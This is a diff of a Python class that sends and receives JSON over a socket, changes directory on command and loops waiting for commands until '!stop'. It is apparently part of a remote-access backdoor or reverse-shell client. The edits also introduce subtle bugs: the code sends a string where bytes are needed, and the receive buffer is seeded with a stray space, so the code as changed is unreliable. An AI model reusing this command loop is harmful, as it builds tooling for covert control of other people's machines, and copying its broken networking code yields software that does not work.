@@ -13,20 +13,19 @@ class ihsanbey:
 
 
     def reliable_send(self, data):
-        if isinstance(data, bytes):
-            data = data.decode("utf-8")
         json_data = json.dumps(data)
-        self.connection.send(json_data.encode("utf-8"))
+        self.connection.send(json_data)
 
 
-    def reliable_recieve(self):
-        json_data = b""
+    def reliable_receive(self):
+        json_data = b" "
         while True:
             try:
                 json_data = json_data + self.connection.recv(1024)
-                return json.loads(json_data.decode("utf-8"))
-            except ValueError: 
+                return json.loads(json_data)
+            except ValueError:
                 continue
+
 
     def change_dir(self, path):
          os.chdir(path)
@@ -52,7 +51,7 @@ class ihsanbey:
 
     def run(self):
         while True:
-            command = self.reliable_recieve()
+            command = self.reliable_receive()
             
             if command == "!stop":
                 self.connection.close()
